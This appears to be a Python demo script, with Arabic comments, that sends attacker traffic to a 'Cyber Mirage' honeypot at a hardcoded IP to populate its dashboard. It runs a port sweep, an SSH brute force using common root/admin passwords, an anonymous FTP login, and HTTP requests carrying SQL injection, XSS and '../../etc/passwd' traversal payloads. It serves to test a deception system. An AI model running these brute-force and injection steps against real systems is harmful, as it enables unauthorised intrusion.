#!/usr/bin/env python3
"""
Cyber Mirage Attacker Demo Script
---------------------------------
تشغيل هذا السكريبت من جهاز Ubuntu (بيئة مهاجم) لاستعراض:
1. فحص المنافذ (nmap اختياري إذا مثبّت)
2. محاولات محدودة brute force على SSH (منفذ 2222)
3. اختبار Anonymous FTP (منفذ 2121)
4. مستطلبات HTTP بــ payloads (XSS / SQLi / Path traversal)
5. استعلامات MySQL تحاكي محاولة اتصال
6. عرض النتائج وتسجيلها محلياً ثم طباعة تقرير نهائي

ملاحظة: كل شيء محدود وآمن—لا يستخدم قوائم ضخمة ولا هجمات إغراق.
تشغيل: python3 attack_demo.py

المتطلبات:
    pip install paramiko requests colorama

"""
import os
import time
import socket
import paramiko
import requests
from ftplib import FTP
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)
TARGET_IP = "13.53.131.159"
PORTS = {
    "SSH": 2222,
    "FTP": 2121,
    "HTTP": 8080,
    "MySQL": 3307,
    "TELNET": 2323,
    "DASHBOARD": 8501,
}
OUTPUT_FILE = "attack_demo_results.log"

SSH_USERS = ["root", "admin"]
SSH_PASSWORDS = ["admin", "123456", "password", "root123"]  # قصيرة للعرض
HTTP_PAYLOADS = [
    {"desc": "SQLi classic", "param": "admin' OR '1'='1"},
    {"desc": "XSS simple", "param": "<script>alert('XSS')</script>"},
    {"desc": "Path traversal", "param": "../../etc/passwd"},
    {"desc": "Boolean test", "param": "' OR 1=1--"},
]

REPORT = []

def log(line: str):
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.utcnow().isoformat()}Z | {line}\n")
    print(line)

def banner(title: str):
    print(f"\n{Fore.CYAN}{'='*70}\n{title}\n{'='*70}{Style.RESET_ALL}")

# 1. Basic port reachability (TCP connect)

def check_ports():
    banner("[1] فحص المنافذ (TCP connect)")
    for name, port in PORTS.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        start = time.time()
        try:
            s.connect((TARGET_IP, port))
            elapsed = (time.time() - start) * 1000
            msg = f"PORT {port} ({name}) OPEN - {elapsed:.1f} ms"
            log(Fore.GREEN + msg)
            REPORT.append(msg)
        except Exception as e:
            msg = f"PORT {port} ({name}) CLOSED/UNREACHABLE - {e}";
            log(Fore.RED + msg)
            REPORT.append(msg)
        finally:
            s.close()

# 2. Limited SSH brute force attempts

def ssh_bruteforce():
    banner("[2] محاولات محدودة SSH Brute Force")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attempts = 0
    for user in SSH_USERS:
        for pwd in SSH_PASSWORDS:
            attempts += 1
            try:
                client.connect(TARGET_IP, port=PORTS["SSH"], username=user, password=pwd, timeout=4)
                msg = f"SSH SUCCESS user={user} password={pwd}"
                log(Fore.GREEN + msg)
                REPORT.append(msg)
                client.close()
                return  # نتوقف مباشرة عند نجاح واحد
            except Exception:
                msg = f"SSH FAIL user={user} password={pwd}"
                log(Fore.YELLOW + msg)
                REPORT.append(msg)
                time.sleep(0.7)  # تهدئة بسيطة
    log(Fore.MAGENTA + f"انتهت المحاولات بدون نجاح (Total attempts: {attempts})")

# 3. Anonymous FTP test

def ftp_anonymous():
    banner("[3] اختبار FTP Anonymous")
    try:
        ftp = FTP()
        ftp.connect(TARGET_IP, PORTS["FTP"], timeout=5)
        ftp.login("anonymous", "guest@example.com")
        files = []
        ftp.retrlines('LIST', lambda line: files.append(line))
        msg = f"FTP ANON SUCCESS, entries={len(files)}"
        log(Fore.GREEN + msg)
        REPORT.append(msg)
        ftp.quit()
    except Exception as e:
        msg = f"FTP ANON FAILED: {e}"
        log(Fore.RED + msg)
        REPORT.append(msg)

# 4. HTTP payload injections

def http_payloads():
    banner("[4] هجمات HTTP بسيطة (GET/Query)")
    base = f"http://{TARGET_IP}:{PORTS['HTTP']}"
    test_paths = ["/login", "/search", "/ping"]
    for p in test_paths:
        for payload in HTTP_PAYLOADS:
            url = f"{base}{p}?q={payload['param']}"
            try:
                r = requests.get(url, timeout=5)
                msg = f"HTTP {payload['desc']} path={p} status={r.status_code} len={len(r.text)}"
                log(Fore.GREEN + msg)
                REPORT.append(msg)
                time.sleep(0.5)
            except Exception as e:
                msg = f"HTTP ERROR path={p} desc={payload['desc']} err={e}";
                log(Fore.RED + msg)
                REPORT.append(msg)

# 5. MySQL connection attempt (no brute force)

def mysql_probe():
    banner("[5] محاولة اتصال MySQL (مستوى الشبكة)")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((TARGET_IP, PORTS["MySQL"]))
        # استلام أول باكيت (Handshake عادة)
        data = s.recv(128)
        msg = f"MySQL banner bytes={len(data)}"
        log(Fore.GREEN + msg)
        REPORT.append(msg)
    except Exception as e:
        msg = f"MySQL probe failed: {e}";
        log(Fore.RED + msg)
        REPORT.append(msg)
    finally:
        s.close()

# 6. Final summary

def summary():
    banner("[6] التقرير النهائي")
    for line in REPORT:
        print(Fore.WHITE + "- " + line)
    print(f"\nتم حفظ السجل في: {OUTPUT_FILE}")
    print("\nاعرض الـ Dashboard الآن للتحقق من ظهور النشاط الجديد:")
    print(f"  -> http://{TARGET_IP}:{PORTS['DASHBOARD']}")
    print("إن رغبت، افحص قاعدة البيانات و Redis كما في دليل الاختبار.")

if __name__ == "__main__":
    start_all = time.time()
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
    log(Fore.BLUE + f"بدء سكريبت العرض ضد الهدف {TARGET_IP}")
    check_ports()
    ssh_bruteforce()
    ftp_anonymous()
    http_payloads()
    mysql_probe()
    summary()
    log(Fore.BLUE + f"انتهى التنفيذ خلال {(time.time()-start_all):.1f} ثانية")
